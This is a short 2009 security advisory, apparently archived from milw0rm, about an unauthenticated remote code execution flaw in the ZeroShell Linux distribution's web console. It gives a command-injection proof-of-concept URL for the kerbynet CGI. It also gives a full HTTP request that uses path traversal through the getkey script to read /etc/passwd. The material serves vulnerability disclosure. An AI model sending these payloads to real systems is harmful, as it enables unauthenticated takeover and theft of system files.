@@ -1,0 +1,34 @@
+==================================================== 
+ZeroShell <= 1.0beta11 Remote Code Execution
+
+Original Advisory: 
+http://www.ikkisoft.com/stuff/LC-2009-01.txt
+
+luca.carettoni[at]ikkisoft[dot]com
+==================================================== 
+
+
+ZeroShell (http://www.zeroshell.net/eng/) is a small Linux distribution 
+for servers and embedded devices. This Linux distro can be configured 
+and managed with an easy to use web console.
+
+ZeroShell is prone to an arbitrary code execution vulnerability due to
+an improper input validation mechanism. An aggressor may abuse this 
+weakness in order to compromise the entire system. 
+Authentication is not required in order to exploit this flaw.
+
+[Proof of Concept]
+  
+/cgi-bin/kerbynet?Section=NoAuthREQ&Action=x509List&type=*%22;<CMD HERE>;%22
+  
+In addition to the Unix commands, it is possible to abuse the 
+ZeroShell scripts themself. For instance it is likely to use the 
+"getkey" script in order to retrieve remote files, including the content
+in the html page.
+  
+{HTTP REQUEST}
+GET /cgi-bin/kerbynet?Section=NoAuthREQ&Action=x509List&type=*%22;
+/root/kerbynet.cgi/scripts/getkey%20../../../etc/passwd;%22 HTTP/1.1
+Host: <IP>
+
+# milw0rm.com [2009-02-09]
